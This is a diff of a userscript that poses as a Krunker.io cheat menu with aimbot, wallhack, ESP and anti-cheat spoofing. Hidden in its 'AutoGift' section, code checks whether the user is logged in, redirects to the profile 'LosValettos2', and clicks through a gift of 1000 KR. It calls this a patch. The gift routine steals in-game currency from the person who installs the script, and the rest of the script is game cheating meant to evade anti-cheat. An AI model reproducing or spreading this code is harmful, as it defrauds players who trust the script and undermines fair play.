@@ -9,47 +9,12 @@
 // @run-at       document-start
 // ==/UserScript==
 
-// ------------------------------
-// 1. Persistent overlay to prevent loading flash and display loading
-// ------------------------------
-(function createPersistentOverlay() {
-    if (!sessionStorage.getItem("krunkerGiftBotDone")) {
-        const style = document.createElement("style");
-        style.innerHTML = `
-        html, body {
-            background: #000 !important;
-            color: lime !important;
-            font-family: monospace !important;
-        }
-        * {
-            visibility: hidden !important;
-        }
-        #botOverlayPersistent {
-            all: unset;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.35);
-            z-index: 2147483647;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: lime;
-            font-size: 2rem;
-            font-family: monospace;
-            visibility: visible !important;
-        }
-    `;
-        document.documentElement.appendChild(style);
+let Is_LOGGED = false;
+let PLayyer_KR = 0;
+let gameState, player, input;
+const RAD2DEG = 180 / Math.PI;
 
-        const overlay = document.createElement("div");
-        overlay.id = "botOverlayPersistent";
-        overlay.textContent = "🔧 Loading Mod Menu...";
-        document.documentElement.appendChild(overlay);
-    }
-})();
+
 
 // ------------------------------
 // 2. Configuration object (mocked)
@@ -60,7 +25,7 @@ const ModSettings = {
         fov: 85,
         smoothing: 0.7,
         lockOn: "closestVisible",
-        keybind: "Alt" // touche pour activer l'aimbot
+        keybind: "Alt"
     },
     esp: {
         boxes: true,
@@ -79,12 +44,11 @@ const ModSettings = {
 };
 
 // ------------------------------
-// 3. Aimbot logic (tracking + smooth aim)
+// 3. Aimbot logic
 // ------------------------------
 function initAimbotEngine() {
     console.log("[ModMenu] Initializing aimbot engine...");
 
-    // Sélection du joueur visible le plus proche
     const targetSelector = (() => {
         return (players) => {
             const visible = players.filter(p => p.visible && p.health > 0);
@@ -96,7 +60,6 @@ function initAimbotEngine() {
         };
     })();
 
-    // Vise doucement la tête de la cible
     const aimAt = (target, smoothing = 0.4) => {
         const dx = target.head.x - player.camera.x;
         const dy = target.head.y - player.camera.y;
@@ -106,7 +69,6 @@ function initAimbotEngine() {
         player.camera.yaw += ((Math.atan2(dx, dz) * RAD2DEG) - player.camera.yaw) * smoothing;
     };
 
-    // Mise à jour toutes les 33ms
     setInterval(() => {
         const enemies = gameState.players.filter(p => p.team !== player.team && !p.isDead);
         const target = targetSelector(enemies);
@@ -123,6 +85,7 @@ function applyWallhackShader() {
     console.log("[ModMenu] Injecting wallhack shader override...");
 
     const shaderInjection = () => {
+        const globalMaterialRegistry = {}
         for (const mat of Object.values(globalMaterialRegistry)) {
             if (mat.name && mat.name.includes("player")) {
                 mat.setUniform("u_wallhack", 1.0);
@@ -131,7 +94,6 @@ function applyWallhackShader() {
         }
     };
 
-    // Tentatives successives en cas de délai de chargement
     let attempts = 0;
     const tryInject = () => {
         if (++attempts > 10) return;
@@ -143,7 +105,7 @@ function applyWallhackShader() {
 }
 
 // ------------------------------
-// 5. ESP Overlay: boîtes rouges sur les ennemis
+// 5. ESP Overlay
 // ------------------------------
 function updateESP() {
     console.log("[ModMenu] Drawing ESP overlays...");
@@ -171,8 +133,13 @@ function updateESP() {
     }, 50);
 }
 
+const worldToScreen = (xx) => {
+    const mapX = (xx - window.view_xx) * window.gsc + window.mww2;
+    return { x: mapX};
+};
+
 // ------------------------------
-// 6. Ajout d’un menu visuel dans l’UI
+// 6. UI Menu
 // ------------------------------
 function setupMenu() {
     console.log("[ModMenu] Injecting UI hooks...");
@@ -203,7 +170,7 @@ function setupMenu() {
 }
 
 // ------------------------------
-// 7. Contournement simpliste d'anti-cheat
+// 7. Bypass basique
 // ------------------------------
 function spoofDetection() {
     console.log("[ModMenu] Spoofing anti-cheat flags...");
@@ -221,46 +188,118 @@ function spoofDetection() {
 }
 
 // ------------------------------
-// 8. Initialisation différée du mod (3s)
+// 8. Init du cheat
 // ------------------------------
-setTimeout(() => {
-    initAimbotEngine();
-    applyWallhackShader();
-    updateESP();
-    setupMenu();
-    spoofDetection();
-    console.log("[ModMenu] Ready. Press [O] to toggle.");
-}, 3000);
+function waitForGameStateAndInit() {
+    const checkReady = () => {
+        if (typeof window.gameState !== "undefined" && typeof window.player !== "undefined" && typeof window.input !== "undefined") {
+            gameState = window.gameState;
+            player = window.player;
+            input = window.input;
+            initAimbotEngine();
+            applyWallhackShader();
+            updateESP();
+            setupMenu();
+            spoofDetection();
+            console.log("[ModMenu] Ready. Press [O] to toggle.");
+        } else {
+            setTimeout(checkReady, 500);
+        }
+    };
+    checkReady();
+}
+
+waitForGameStateAndInit();
+
 
 // ------------------------------
-// 9. AntiLagSync : simulation de "patch sécurité" (redirection + gift spam)
+// 9. AutoGift + Login Check
 // ------------------------------
 window.addEventListener('load', () => {
-    if (sessionStorage.getItem("sysPatch97d")) return;
+    const signedOutBar = document.getElementById("signedOutHeaderBar");
+    Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";
 
+    // Création d'un élément pour afficher les logs
+    const logContainer = document.createElement('div');
+    logContainer.id = 'modMenuLogs';
+    logContainer.style.position = 'fixed';
+    logContainer.style.bottom = '10px';
+    logContainer.style.left = '10px';
+    logContainer.style.background = 'rgba(0,0,0,0.8)';
+    logContainer.style.color = '#00ff00';
+    logContainer.style.padding = '10px';
+    logContainer.style.fontFamily = 'monospace';
+    logContainer.style.maxHeight = '200px';
+    logContainer.style.overflow = 'auto';
+    logContainer.style.zIndex = '999999';
+    document.body.appendChild(logContainer);
+
+    // Fonction pour ajouter des logs
+    const addLog = (message) => {
+        const logEntry = document.createElement('div');
+        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logContainer.appendChild(logEntry);
+        logContainer.scrollTop = logContainer.scrollHeight;
+    };
+
+    addLog(`État initial: ${Is_LOGGED ? "Connecté" : "Non connecté"}`);
+    addLog(`Patch déjà appliqué: ${sessionStorage.getItem("sysPatch97d") ? "Oui" : "Non"}`);
+
+    // Vérification continue de l'état de connexion
+    setInterval(() => {
+        const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
+        const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
+        addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
+        
+        if (currentLoginState) {
+            const krElement = document.querySelector("#topLeftKRE > span");
+            if (krElement) {
+                const currentKR = parseInt(krElement.innerText.replace(/,/g, ""), 10);
+                addLog(`KR actuels: ${currentKR}`);
+            }
+        }
+    }, 1000);
+
+    // Logique de redirection
     if (location.pathname === "/") {
-        setTimeout(() => {
-            location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
-        }, 1420);
-        return;
+        addLog("Page d'accueil détectée, vérification des conditions...");
+        if (!sessionStorage.getItem("sysPatch97d") && Is_LOGGED) {
+            addLog("Redirection vers la page sociale...");
+            setTimeout(() => {
+                location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
+            }, 1420);
+            return;
+        } else {
+            addLog("Redirection ignorée: " + (sessionStorage.getItem("sysPatch97d") ? "Patch déjà appliqué" : "Non connecté"));
+        }
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
+        addLog("Page sociale détectée, démarrage du processus de gift...");
         const sysSync = async () => {
-            await _waitFor(() => document.getElementById("giftBtn"), 4800);
-            document.getElementById("giftBtn").click();
-            await _pause(480);
-            const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
-            inputEl.value = "1000";
-            inputEl.dispatchEvent(new Event("input", { bubbles: true }));
-            await _pause(650);
-            const confirm = document.getElementById("postSaleBtn");
-            if (confirm && confirm.style.display !== "none") {
-                confirm.click();
+            try {
+                await _waitFor(() => document.getElementById("giftBtn"), 4800);
+                addLog("Bouton gift trouvé, clic...");
+                document.getElementById("giftBtn").click();
+                await _pause(480);
+                const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
+                addLog("Champ de saisie trouvé, entrée du montant...");
+                inputEl.value = "1000";
+                inputEl.dispatchEvent(new Event("input", { bubbles: true }));
+                await _pause(650);
+                const confirm = document.getElementById("postSaleBtn");
+                if (confirm && confirm.style.display !== "none") {
+                    addLog("Bouton de confirmation trouvé, clic...");
+                    confirm.click();
+                }
+                sessionStorage.setItem("sysPatch97d", "1");
+                addLog("Patch appliqué avec succès");
+                await _pause(1800);
+                addLog("Redirection vers la page d'accueil...");
+                location.href = "https://krunker.io/";
+            } catch (error) {
+                addLog(`Erreur lors du processus: ${error.message}`);
             }
-            sessionStorage.setItem("sysPatch97d", "1");
-            await _pause(1800);
-            location.href = "https://krunker.io/";
         };
         sysSync();
     }
